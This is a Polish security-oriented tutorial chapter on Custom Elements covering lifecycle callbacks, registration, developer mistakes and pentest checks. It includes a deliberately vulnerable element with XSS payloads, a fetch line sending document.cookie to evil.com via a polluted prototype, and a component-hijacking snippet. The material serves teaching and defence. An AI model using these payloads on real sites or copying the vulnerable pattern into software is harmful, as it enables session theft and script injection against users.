# Rozdział 32: Custom Elements

## 1. Czym są Custom Elements

**Custom Elements** to część specyfikacji Web Components umożliwiająca tworzenie własnych, reużywalnych elementów HTML z niestandardowymi nazwami i zachowaniem. Custom Element to klasa JavaScript rozszerzająca `HTMLElement`, rejestrowana przez `customElements.define()` i używana w HTML jak standardowy tag.

Dwa typy Custom Elements:
- **Autonomous Custom Elements** — zupełnie nowe elementy (np. `<my-button>`)
- **Customized Built-in Elements** — rozszerzenie istniejących elementów (np. `<button is="my-button">`)

Custom Elements są podstawą Web Components (razem z Shadow DOM i HTML Templates) — umożliwiają tworzenie enkapsulowanych komponentów UI wielokrotnego użytku, używalnych jak natywne tagi HTML.

---

## 2. Dlaczego powstał

### Problem: brak reużywalnych komponentów w HTML

Przed Custom Elements tworzenie komponentów wymagało:
- Frameworków (React, Angular, Vue) — każdy z własnym modelem komponentów
- Manualnego zarządzania lifecycle, DOM, stylami
- Brak interoperabilności między frameworkami

Custom Elements (HTML5/Web Components, specyfikacja v1 2016) dostarcza natywne komponenty:
- Działają bez frameworku
- Interoperacyjne — React, Vue, Angular mogą używać Custom Elements
- Lifecycle hooks wbudowane w przeglądarkę
- Observowalne atrybuty

---

## 3. Jak działa

### Definicja Custom Element

```javascript
class MyButton extends HTMLElement {
    // Obserwowane atrybuty — zmiany triggerują attributeChangedCallback
    static get observedAttributes() {
        return ['label', 'disabled', 'variant'];
    }
    
    constructor() {
        super(); // WYMAGANE
        // Tutaj inicjalizacja — ale NIE manipuluj DOM! (nie ma jeszcze w dokumencie)
        this._shadow = this.attachShadow({ mode: 'open' });
    }
    
    // Lifecycle Callbacks:
    
    connectedCallback() {
        // Element dodany do dokumentu (DOM ready)
        this._render();
        this._addEventListeners();
    }
    
    disconnectedCallback() {
        // Element usunięty z dokumentu
        this._removeEventListeners(); // cleanup!
    }
    
    attributeChangedCallback(name, oldValue, newValue) {
        // Atrybut zmieniony (tylko obserwowane!)
        if (name === 'label') this._updateLabel(newValue);
        if (name === 'disabled') this._toggleDisabled(newValue !== null);
    }
    
    adoptedCallback() {
        // Element przeniesiony do nowego dokumentu (np. przez adoptNode)
    }
    
    // Publiczne API
    get label() { return this.getAttribute('label'); }
    set label(val) { this.setAttribute('label', val); }
    
    _render() {
        this._shadow.innerHTML = `
            <style>
                button { padding: 8px 16px; cursor: pointer; }
                :host([variant="primary"]) button { background: blue; color: white; }
            </style>
            <button part="button">
                <slot></slot>
            </button>
        `;
    }
}

// Rejestracja — nazwa MUSI zawierać myślnik!
customElements.define('my-button', MyButton);
```

### Użycie w HTML

```html
<my-button label="Kliknij mnie" variant="primary">Tekst przycisku</my-button>

<script>
    const btn = document.querySelector('my-button');
    btn.label = 'Nowy label'; // wywołuje attributeChangedCallback
    
    // Lub imperatywnie:
    const btn2 = document.createElement('my-button');
    btn2.setAttribute('label', 'Dynamicznie stworzony');
    document.body.appendChild(btn2);
</script>
```

### customElements Registry

```javascript
// Sprawdź czy zarejestrowany
customElements.get('my-button'); // → klasa MyButton lub undefined

// Poczekaj na definicję (jeśli async loading)
await customElements.whenDefined('my-button');
document.querySelector('my-button').label; // teraz bezpiecznie

// Upgrade — jeśli element był w DOM przed rejestracją:
// Przeglądarka "upgraduje" go gdy define() jest wywołane
```

---

## 4. Co dzieje się wewnętrznie

### Upgrade mechanism

Jeśli HTML parser napotka nieznany tag `<my-button>`:
1. Tworzy `HTMLElement` (generic)
2. Gdy `customElements.define('my-button', MyButton)` jest wywołane → przeglądarka upgraduje wszystkie istniejące `<my-button>` do instancji `MyButton`
3. Wywołuje `constructor()` i `connectedCallback()`

### Lifecycle kolejność

```
parser widzi <my-element>
    ↓
createElement (HTMLElement jeśli brak definicji)
    ↓
customElements.define() wywołane
    ↓
constructor()
    ↓
connectedCallback() (po dodaniu do DOM)
    ↓
attributeChangedCallback() (gdy atrybut zmieniony)
    ↓
disconnectedCallback() (po usunięciu z DOM)
```

### `is=""` — Customized Built-in

```javascript
class FancyButton extends HTMLButtonElement {
    connectedCallback() {
        this.style.background = 'linear-gradient(...)';
    }
}
customElements.define('fancy-button', FancyButton, { extends: 'button' });

// W HTML:
// <button is="fancy-button">Kliknij</button>
// Safari nie wspiera tej formy!
```

---

## 5. Analogiczny przykład z życia

Custom Elements to LEGO z własnym schematem:

- Tworzysz nowy klocek LEGO (Custom Element) ze swoją instrukcją montażu
- Możesz go składać ze standardowymi klockami (innymi HTML elementami)
- Klocek ma własne zachowanie gdy go dotkniesz (lifecycle hooks)
- Możesz zdefiniować jak wygląda gdy się go połączy (connectedCallback)
- Inne osoby mogą używać twojego klocka (reużywalność)

---

## 6. Przykład kodu

```javascript
// === Bezpieczny Custom Element z sanityzacją ===
class SafeRichText extends HTMLElement {
    static get observedAttributes() { return ['content']; }
    
    constructor() {
        super();
        this._shadow = this.attachShadow({ mode: 'open' });
    }
    
    connectedCallback() {
        this._render();
    }
    
    attributeChangedCallback(name, oldValue, newValue) {
        if (name === 'content') this._updateContent(newValue);
    }
    
    _render() {
        this._shadow.innerHTML = `
            <style>
                :host { display: block; font-family: inherit; }
                .content { padding: 8px; }
            </style>
            <div class="content"></div>
        `;
        this._updateContent(this.getAttribute('content') ?? '');
    }
    
    _updateContent(html) {
        const container = this._shadow.querySelector('.content');
        if (!container) return;
        
        // BEZPIECZNE: sanityzuj HTML przed wstawieniem
        const sanitized = DOMPurify.sanitize(html, {
            ALLOWED_TAGS: ['b', 'i', 'u', 'strong', 'em', 'a', 'p', 'br'],
            ALLOWED_ATTR: ['href', 'target']
        });
        
        container.innerHTML = sanitized;
    }
    
    // Publiczne API
    set content(html) {
        this.setAttribute('content', html);
    }
    
    get content() {
        return this.getAttribute('content');
    }
}

customElements.define('safe-rich-text', SafeRichText);
```

---

## 7. Przykład z prawdziwej aplikacji

### XSS przez Custom Element attribute

```javascript
// PODATNY Custom Element:
class UserCard extends HTMLElement {
    static get observedAttributes() { return ['username', 'bio']; }
    
    attributeChangedCallback(name, old, newVal) {
        if (name === 'bio') {
            // BŁĄD: bezpośrednie wstawianie bio do innerHTML
            this.shadowRoot.querySelector('.bio').innerHTML = newVal;
        }
    }
}
customElements.define('user-card', UserCard);

// Atak:
document.querySelector('user-card').setAttribute('bio', '<img src=x onerror=alert(1)>');
// Lub w HTML: <user-card bio="&lt;img src=x onerror=alert(1)&gt;">
// Jeśli aplikacja nie enkoduje atrybutu → XSS!
```

### Prototype Pollution a Custom Elements

```javascript
// Jeśli Prototype Pollution (Rozdział 7) zainfekuje HTMLElement.prototype:
HTMLElement.prototype.connectedCallback = function() {
    fetch('https://evil.com/steal?' + document.cookie);
};
// Każdy Custom Element który nie nadpisuje connectedCallback → exfiltracja!

// Obrona: Object.freeze prototypów (trudne w praktyce)
```

---

## 8. Typowe błędy programistów

### Błąd 1: Manipulacja DOM w konstruktorze

```javascript
// BŁĄD: manipulacja DOM w constructor
constructor() {
    super();
    this.innerHTML = '...'; // Błąd lub undefined behavior!
    // Element nie jest jeszcze w dokumencie!
}

// POPRAWKA: DOM manipulation w connectedCallback
connectedCallback() {
    this.innerHTML = '...'; // OK
}
```

### Błąd 2: Wyciek event listenerów

```javascript
// BŁĄD: addEventListener bez cleanup
connectedCallback() {
    document.addEventListener('keydown', this._handleKey.bind(this));
    // Brak removeEventListener w disconnectedCallback → memory leak!
}

// POPRAWKA:
connectedCallback() {
    this._keyHandler = this._handleKey.bind(this);
    document.addEventListener('keydown', this._keyHandler);
}
disconnectedCallback() {
    document.removeEventListener('keydown', this._keyHandler);
}
```

### Błąd 3: Brak super() w constructor

```javascript
// BŁĄD: brak super() → TypeError
constructor() {
    // super() pominięte → ReferenceError: Must call super constructor
    this._shadow = this.attachShadow({ mode: 'open' });
}
```

---

## 9. Znaczenie dla bezpieczeństwa

### XSS przez atrybuty obserwowane

Atrybuty Custom Elements (ustawiane przez HTML lub JS) mogą być wektorem XSS jeśli `attributeChangedCallback` wstawia wartość do `innerHTML` bez sanityzacji.

### Inspekcja Custom Elements przez DevTools

Custom Elements są widoczne w DevTools tak samo jak natywne elementy:
- Elements panel → można zobaczyć shadow DOM, atrybuty
- Console → `customElements.get('my-element')` → klasa
- `$0.__proto__` → prototype chain

### Upgrade Timing Attack

Jeśli skrypt ładuje się asynchronicznie:
```javascript
// Atakujący może zdefiniować element zanim oryginalny moduł to zrobi:
customElements.define('app-login', MaliciousLoginClass);
// Oryginalny moduł:
// customElements.define('app-login', RealLoginClass); // Błąd! Już zdefiniowane!
```

To umożliwia **Component Hijacking** jeśli atakujący może wykonać JS przed załadowaniem aplikacji (CSP bypass, XSS, supply chain).

### Powiązane CWE

- **CWE-79** — XSS (przez atrybuty obserwowane i innerHTML)
- **CWE-94** — Code Injection (Component Hijacking przez wcześniejszą definicję)

---

## 10. Jak identyfikować podczas pentestu

### DevTools

```javascript
// Lista wszystkich Custom Elements:
// Nie ma bezpośredniego API, ale:
Array.from(document.querySelectorAll('*'))
    .filter(el => el.tagName.includes('-'))
    .map(el => el.tagName.toLowerCase())
    .filter((v, i, a) => a.indexOf(v) === i); // unikalne

// Pobierz klasę:
customElements.get('my-component');

// Sprawdź czy komponenty mają shadow DOM:
document.querySelector('my-component').shadowRoot;
```

### Testowanie

```javascript
// Testuj czy atrybuty prowadzą do XSS:
document.querySelector('user-card').setAttribute('name', '<img src=x onerror=alert(1)>');
document.querySelector('user-card').setAttribute('bio', '"><script>alert(1)</script>');

// Sprawdź czy HTMLElement.prototype jest zmodyfikowany:
HTMLElement.prototype.connectedCallback; // undefined lub native?
```

---

## 11. Jak testować bezpieczeństwo

```
□ Czy atrybuty obserwowane wstawiane do innerHTML bez sanityzacji (XSS)?
□ Czy możliwy component hijacking (definicja custom elementu przed oryginalną)?
□ Czy prototype pollution może wpłynąć na Custom Element lifecycle callbacks?
□ Czy event listenery są czyszczone w disconnectedCallback?
□ Czy shadow DOM (open) w Custom Elements nie ujawnia wrażliwych danych?
□ Czy adoptedCallback obsługuje przeniesienie elementu do innego dokumentu bezpiecznie?
```

---

## 12. Jak się zabezpieczać

```javascript
// 1. Zawsze sanityzuj przed innerHTML w Custom Element
attributeChangedCallback(name, old, newVal) {
    if (name === 'content') {
        this._shadow.querySelector('.content').innerHTML = 
            DOMPurify.sanitize(newVal);
    }
}

// 2. Używaj textContent dla text-only
attributeChangedCallback(name, old, newVal) {
    if (name === 'label') {
        this._shadow.querySelector('span').textContent = newVal; // bezpieczne
    }
}

// 3. Subresource Integrity dla Custom Element skryptów
// <script src="/components/my-element.js" integrity="sha384-..."></script>
// Zapobiega supply chain hijacking

// 4. CSP chroni przed XSS:
// Content-Security-Policy: script-src 'self' 'nonce-xyz'
```

---

## 13. Podsumowanie

**Kluczowe fakty:**

1. Custom Elements = własne HTML tagi z lifecycle hooks i obserwowanymi atrybutami
2. Nazwy MUSZĄ zawierać myślnik (np. `my-element`)
3. `connectedCallback` zamiast konstruktora dla DOM manipulation
4. XSS przez `attributeChangedCallback` + `innerHTML` bez sanityzacji
5. Component Hijacking jeśli atakujący definiuje element przed oryginalem

**Dla pentestera:**
- Testuj wszystkie atrybuty Custom Elements na XSS
- Szukaj `innerHTML` w `attributeChangedCallback` bez sanityzacji
- Sprawdź czy możliwa jest wcześniejsza definicja elementu (component hijacking)

---

## Powiązania

```
Custom Elements
    │
    ├──► Shadow DOM (Rozdział 31)
    │         Zazwyczaj używane razem — Web Components
    │
    ├──► Web Components (Rozdział 33)
    │         Custom Elements + Shadow DOM + HTML Templates = Web Components
    │
    ├──► DOM/XSS (Rozdział 9)
    │         XSS przez atrybuty obserwowane i innerHTML w callbacks
    │
    └──► Prototype Pollution (Rozdział 7)
              Pollution może wpłynąć na prototype chain Custom Elements
```
